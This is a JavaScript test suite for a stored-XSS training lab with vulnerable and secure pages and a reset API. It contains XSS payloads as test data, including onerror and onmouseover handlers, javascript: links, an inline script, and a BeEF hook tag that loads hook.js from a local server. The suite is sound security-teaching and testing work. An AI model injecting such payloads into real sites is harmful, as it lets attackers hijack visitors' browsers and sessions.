import test from 'node:test';
import assert from 'node:assert';
import http from 'node:http';
import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { createApp } from '../src/server/app.js';
import { resetMessages, getMessages } from '../src/storage/messageStore.js';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const DATA_FILE = path.resolve(__dirname, '../data/messages.json');

function makeRequest(server, path, method = 'GET', body = null, isForm = false) {
  return new Promise((resolve, reject) => {
    const address = server.address();
    const options = {
      hostname: '127.0.0.1',
      port: address.port,
      path: path,
      method: method,
      headers: {}
    };

    if (body) {
      if (isForm) {
        options.headers['Content-Type'] = 'application/x-www-form-urlencoded';
        body = new URLSearchParams(body).toString();
      } else if (typeof body === 'object') {
        options.headers['Content-Type'] = 'application/json';
        body = JSON.stringify(body);
      }
      options.headers['Content-Length'] = Buffer.byteLength(body);
    }

    const req = http.request(options, (res) => {
      let data = '';
      res.on('data', (chunk) => { data += chunk; });
      res.on('end', () => {
        resolve({
          statusCode: res.statusCode,
          headers: res.headers,
          body: data
        });
      });
    });

    req.on('error', reject);
    if (body) req.write(body);
    req.end();
  });
}

test('Stored XSS Lab Suite - v2 Multi-Field Datastore & Database Reset', async (t) => {
  const app = createApp();
  const server = http.createServer(app);

  await new Promise((resolve) => {
    server.listen(0, '127.0.0.1', resolve);
  });

  t.beforeEach(() => {
    resetMessages();
  });

  t.after(() => {
    server.close();
    resetMessages();
  });

  await t.test('Stored XSS (Vulnerable) page loads with initial seeded messages', async () => {
    const res = await makeRequest(server, '/labs/stored');
    assert.strictEqual(res.statusCode, 200);
    assert.ok(res.body.includes('Stored XSS'));
    assert.ok(res.body.includes('Vulnerable'));
    assert.ok(res.body.includes('Welcome to the Stored XSS v2 testing laboratory!'));
  });

  await t.test('Submitting multi-field message persists and renders raw in vulnerable lab', async () => {
    const contentPayload = '<img src=x onerror=alert("stored-body")>';
    const authorPayload = '<b onmouseover=alert(1)>Attacker</b>';
    const websitePayload = 'javascript:alert("stored-link")';

    // Submit message via POST
    const postRes = await makeRequest(server, '/labs/stored', 'POST', {
      author: authorPayload,
      role: 'Injected Role',
      website: websitePayload,
      content: contentPayload
    }, true);

    // Expect redirect
    assert.strictEqual(postRes.statusCode, 302);
    assert.strictEqual(postRes.headers.location, '/labs/stored');

    // Check vulnerable view contains unescaped fields
    const getRes = await makeRequest(server, '/labs/stored');
    assert.strictEqual(getRes.statusCode, 200);
    assert.ok(getRes.body.includes(contentPayload), 'Content payload rendered raw');
    assert.ok(getRes.body.includes(authorPayload), 'Author payload rendered raw');
    assert.ok(getRes.body.includes(`href="${websitePayload}"`), 'Website javascript: link rendered raw');
  });

  await t.test('Stored XSS (Secure) page safely escapes body and sanitizes links', async () => {
    const contentPayload = '<img src=x onerror=alert("stored-body")>';
    const authorPayload = '<b onmouseover=alert(1)>Attacker</b>';
    const websitePayload = 'javascript:alert("stored-link")';

    // Submit message via POST
    await makeRequest(server, '/labs/stored', 'POST', {
      author: authorPayload,
      role: 'Injected Role',
      website: websitePayload,
      content: contentPayload
    }, true);

    // Check secure view encodes the payload and blocks unsafe protocol
    const getRes = await makeRequest(server, '/labs/stored/secure');
    assert.strictEqual(getRes.statusCode, 200);
    assert.ok(getRes.body.includes('Stored XSS'));
    assert.ok(getRes.body.includes('Secure'));
    assert.ok(!getRes.body.includes(contentPayload), 'Raw body payload must NOT be present in secure lab');
    assert.ok(!getRes.body.includes(authorPayload), 'Raw author payload must NOT be present in secure lab');
    assert.ok(!getRes.body.includes(`href="${websitePayload}"`), 'Raw javascript: link must NOT be present in secure lab');
    assert.ok(getRes.body.includes('&lt;img src=x onerror=alert(&quot;stored-body&quot;)&gt;'), 'Content must be HTML encoded');
    assert.ok(getRes.body.includes('&lt;b onmouseover=alert(1)&gt;Attacker&lt;/b&gt;'), 'Author must be HTML encoded');
    assert.ok(getRes.body.includes('#blocked-unsafe-protocol'), 'Unsafe link sanitized');
  });

  await t.test('API endpoints: GET, POST, and Reset message storage with v2 fields', async () => {
    // 1. GET API
    const getApiRes = await makeRequest(server, '/api/stored/messages');
    assert.strictEqual(getApiRes.statusCode, 200);
    const messages = JSON.parse(getApiRes.body);
    assert.ok(Array.isArray(messages));
    assert.strictEqual(messages.length, 2);

    // 2. POST API
    const postApiRes = await makeRequest(server, '/api/stored/messages', 'POST', {
      author: 'API Tester',
      role: 'Automation',
      website: 'https://example.local/api',
      content: 'API Created Content'
    });
    assert.strictEqual(postApiRes.statusCode, 201);
    const createdMsg = JSON.parse(postApiRes.body);
    assert.strictEqual(createdMsg.author, 'API Tester');
    assert.strictEqual(createdMsg.role, 'Automation');
    assert.strictEqual(createdMsg.website, 'https://example.local/api');
    assert.strictEqual(createdMsg.content, 'API Created Content');

    // 3. Reset API
    const resetRes = await makeRequest(server, '/api/stored/reset', 'POST');
    assert.strictEqual(resetRes.statusCode, 200);
    const resetData = JSON.parse(resetRes.body);
    assert.strictEqual(resetData.success, true);
    assert.strictEqual(resetData.count, 2);
  });

  await t.test('Payload-Independence: Stored XSS preserves custom modified payloads and persists them across requests', async () => {
    const customContent = '<div id="custom-stored-node"><script>window.__customExecuted = true; prompt("Stored XSS Modified");</script></div>';
    const customAuthor = '<span onclick="console.log(1)">Custom Author Handle</span>';
    const customRole = '<em>Lead Penetration Tester</em>';
    const customWebsite = 'javascript:confirm("Navigate to stored website")';

    // 1. Submit custom modified entry
    const postRes = await makeRequest(server, '/labs/stored', 'POST', {
      author: customAuthor,
      role: customRole,
      website: customWebsite,
      content: customContent
    }, true);
    assert.strictEqual(postRes.statusCode, 302);

    // 2. Fetch vulnerable page 1st time - verify exact unescaped values
    const firstGet = await makeRequest(server, '/labs/stored');
    assert.ok(firstGet.body.includes(customContent), 'Custom content preserved unescaped');
    assert.ok(firstGet.body.includes(customAuthor), 'Custom author preserved unescaped');
    assert.ok(firstGet.body.includes(customRole), 'Custom role preserved unescaped');
    assert.ok(firstGet.body.includes(`href="${customWebsite}"`), 'Custom website link rendered');

    // 3. Fetch vulnerable page 2nd time (simulate page revisit / reload)
    const secondGet = await makeRequest(server, '/labs/stored');
    assert.ok(secondGet.body.includes(customContent), 'Custom payload survives page reload');

    // 4. Reset database
    await makeRequest(server, '/api/stored/reset', 'POST');
    const postResetGet = await makeRequest(server, '/labs/stored');
    assert.ok(!postResetGet.body.includes(customContent), 'Custom payload successfully cleared on reset');
  });

  await t.test('End-to-End BeEF Hook Payload & Reset Verification (Persistent Data Wipe & Future Execution Block)', async () => {
    const beefHookPayload = '<script src="http://127.0.0.1:3001/hook.js"></script>';

    // STEP 1: Submit stored comment containing BeEF hook
    const submitRes = await makeRequest(server, '/labs/stored', 'POST', {
      author: 'Attacker Hook',
      role: 'BeEF Operator',
      website: 'https://example.local',
      content: beefHookPayload
    }, true);
    assert.strictEqual(submitRes.statusCode, 302);

    // STEP 2: Confirm persisted in disk file (data/messages.json)
    const diskContent = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
    assert.ok(diskContent.some(m => m.content === beefHookPayload), 'Hook payload is stored on disk');

    // STEP 3 & 4: Reload / request page & confirm hook is rendered
    const pageRender = await makeRequest(server, '/labs/stored');
    assert.ok(pageRender.body.includes(beefHookPayload), 'Hook payload is rendered into HTML response');

    // STEP 7: Reset Database
    const resetRes = await makeRequest(server, '/api/stored/reset', 'POST');
    assert.strictEqual(resetRes.statusCode, 200);

    // STEP 8: Confirm removed from disk storage
    const postResetDisk = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
    assert.ok(!postResetDisk.some(m => m.content === beefHookPayload), 'Hook payload wiped from disk');
    assert.strictEqual(postResetDisk.length, 2, 'Only default benign seed messages remain');

    // STEP 9 & 10: Reload page & confirm hook does NOT return
    const cleanPage = await makeRequest(server, '/labs/stored');
    assert.ok(!cleanPage.body.includes(beefHookPayload), 'Deleted hook is NOT rendered in subsequent requests');

    // STEP 11: Inspect API & confirm deleted record is gone
    const apiRes = await makeRequest(server, '/api/stored/messages');
    const apiData = JSON.parse(apiRes.body);
    assert.ok(!apiData.some(m => m.content === beefHookPayload), 'Deleted hook is NOT returned by API');
  });
});
